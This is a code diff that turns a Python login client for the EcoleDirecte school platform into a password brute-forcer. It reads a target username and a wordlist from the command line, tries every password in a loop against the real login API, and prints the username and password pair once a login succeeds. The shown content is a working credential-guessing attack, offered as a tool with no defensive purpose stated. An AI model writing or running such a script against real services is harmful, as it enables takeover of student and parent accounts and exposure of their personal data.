@@ -1,8 +1,11 @@
 import requests as rqs
-DV = False
+import sys
+
 APIVERSION = "4.19.0"
-username = str(input("username : "))
-password = str(input("password : "))
+username = sys.argv[1]
+wordlist = sys.argv[2]
+open_wordlist = open(wordlist, 'r')
+line_wordlist = open_wordlist.readline()
 
 class login:
     def __init__(self, user, password, version="4.18.3"):
@@ -38,13 +41,15 @@ class login:
                 id = response['data']['accounts'][0]['id']
                 email = response['data']['accounts'][0]['email']
                 header['origin'] = "https://www.ecoledirecte.com"
-                print("Succeful auhtentification for " + user + " with this password : " + password)
+                print("Successful authentification " + user + ":" + password)
                 exit()
         elif response['code'] == 505:
-            print("Bad password or username")
+            print("Authentification Failed" + user + ":" + password)
         else:
             raise RequestError('Error {}: {}'.format(response['code'], response['message']))
 
+while line_wordlist:
+    inst = login(username, line_wordlist, APIVERSION)
+    line_wordlist = open_wordlist.readline()
 
-inst = login(username, password, APIVERSION)
 
